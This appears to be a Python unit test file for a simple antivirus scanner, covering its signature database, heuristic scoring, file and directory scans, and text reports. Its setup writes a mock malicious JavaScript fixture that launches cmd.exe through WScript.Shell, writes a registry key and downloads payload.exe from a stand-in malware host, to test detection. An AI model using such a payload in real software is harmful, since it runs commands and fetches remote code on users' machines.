#!/usr/bin/env python3
"""
Test script for the antivirus scanner.
"""
import os
import tempfile
import unittest
from scanner import Scanner
from signatures import SignatureDatabase
from heuristics import HeuristicScanner
from report import ScanReport

class TestAntivirus(unittest.TestCase):
    """Test cases for the antivirus scanner."""

    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        # Use a more sensitive scanner for testing
        self.scanner = Scanner(heuristic_sensitivity=3)

        # Create a clean test file
        self.clean_file_path = os.path.join(self.temp_dir, "clean.txt")
        with open(self.clean_file_path, "w") as f:
            f.write("This is a clean file.")

        # Create a suspicious test file
        self.suspicious_file_path = os.path.join(self.temp_dir, "suspicious.js")
        with open(self.suspicious_file_path, "w") as f:
            f.write("""
function malicious() {
    eval("alert('This is a test')");
    var cmd = "cmd.exe /c calc.exe";
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run(cmd);
    RegCreateKeyEx("HKEY_CURRENT_USER\\Software\\Malware");
    WSAStartup();
    connect();
    URLDownloadToFile("http://malware.example.com/payload.exe");
}
            """)

    def tearDown(self):
        """Clean up test environment."""
        # Remove test files
        if os.path.exists(self.clean_file_path):
            os.remove(self.clean_file_path)
        if os.path.exists(self.suspicious_file_path):
            os.remove(self.suspicious_file_path)

        # Remove temp directory
        os.rmdir(self.temp_dir)

    def test_signature_database(self):
        """Test the signature database."""
        db = SignatureDatabase()
        self.assertGreater(db.get_signature_count(), 0)

        # Add a new signature
        db.add_signature("test_hash", "Test.Virus")
        self.assertIn("test_hash", db.signatures)
        self.assertEqual(db.signatures["test_hash"], "Test.Virus")

    def test_heuristic_scanner(self):
        """Test the heuristic scanner."""
        scanner = HeuristicScanner(sensitivity=3)

        # Test clean file
        is_suspicious, score, reasons = scanner.scan_file(self.clean_file_path)
        self.assertFalse(is_suspicious)
        self.assertLess(score, 3)

        # Test suspicious file
        is_suspicious, score, reasons = scanner.scan_file(self.suspicious_file_path)
        self.assertTrue(is_suspicious)
        self.assertGreaterEqual(score, 3)
        self.assertGreater(len(reasons), 0)

    def test_scanner(self):
        """Test the main scanner."""
        # Test scanning a clean file
        report = ScanReport(self.clean_file_path)
        result = self.scanner.scan_file(self.clean_file_path, report)
        self.assertFalse(result)
        self.assertEqual(report.scanned_files, 1)
        self.assertEqual(len(report.infected_files), 0)
        self.assertEqual(len(report.suspicious_files), 0)

        # Test scanning a suspicious file
        report = ScanReport(self.suspicious_file_path)
        result = self.scanner.scan_file(self.suspicious_file_path, report)
        self.assertTrue(result)
        self.assertEqual(report.scanned_files, 1)
        self.assertGreaterEqual(len(report.suspicious_files), 1)

    def test_directory_scan(self):
        """Test scanning a directory."""
        report = self.scanner.scan_directory(self.temp_dir)
        self.assertEqual(report.total_files, 2)
        self.assertEqual(report.scanned_files, 2)
        self.assertGreaterEqual(len(report.suspicious_files), 1)

    def test_report_generation(self):
        """Test report generation."""
        report = ScanReport(self.temp_dir)
        report.total_files = 10
        report.scanned_files = 8
        report.skipped_files = 2
        report.add_suspicious_file(
            self.suspicious_file_path,
            5,
            ["Contains eval()", "References cmd.exe"]
        )

        report.finalize()
        text_report = report.generate_text_report()

        self.assertIn("ANTIVIRUS SCAN REPORT", text_report)
        self.assertIn("Total files: 10", text_report)
        self.assertIn("Scanned files: 8", text_report)
        self.assertIn("Skipped files: 2", text_report)
        self.assertIn("SUSPICIOUS FILES:", text_report)
        self.assertIn("Contains eval()", text_report)

if __name__ == "__main__":
    unittest.main()
